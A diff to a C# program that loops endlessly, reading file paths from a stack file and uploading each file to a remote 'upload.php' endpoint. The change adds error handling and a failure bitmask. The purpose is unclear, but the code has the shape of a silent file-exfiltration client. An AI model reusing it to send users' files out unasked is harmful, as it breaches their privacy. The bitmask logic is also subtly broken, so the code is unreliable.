@@ -1,4 +1,5 @@
 using System.Net.Http.Headers;
+using System.Numerics;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -36,6 +37,8 @@ internal class Program
             while (true)
             {
                 string[] filesInS = File.ReadAllLines("Upload_Buffer\\File_Stack\\File_Stack.txt");
+                ulong errorColumn = 0;
+                int cnt = 0;
                 foreach (string path in filesInS)
                 {
                     if (path == "") continue;
@@ -51,10 +54,26 @@ internal class Program
                         FileName = Uri.EscapeDataString(Path.GetFileName(path))
                     };
                     content.Add(fileContent);
-                    // content.Add(new ByteArrayContent(File.ReadAllBytes(path)), "file", Uri.EscapeDataString(Path.GetFileName(path)));
-                    HttpClient client = new HttpClient(handler);
-                    HttpResponseMessage res = client.PostAsync(classRegistered + "upload.php", content).Result;
-                    Console.WriteLine(res.Content.ReadAsStringAsync().Result);
+                    try
+                    {
+                        HttpClient client = new HttpClient(handler);
+                        HttpResponseMessage res = client.PostAsync(classRegistered + "upload.php", content).Result;
+                        Console.WriteLine(res.Content.ReadAsStringAsync().Result);
+                    }
+                    catch
+                    {
+                        errorColumn |= (uint) 1 << cnt;
+                    }
+                    cnt++;
+                }
+                string[] fileError = new string[cnt];
+                int cntt = 0;
+                for (int i = 0; i < cnt; i++)
+                {
+                    if ((errorColumn & (uint) 1 << i) > 0)
+                    {
+                        fileError[cntt++] = filesInS[i];
+                    }
                 }
                 Thread.Sleep(5000);
             }
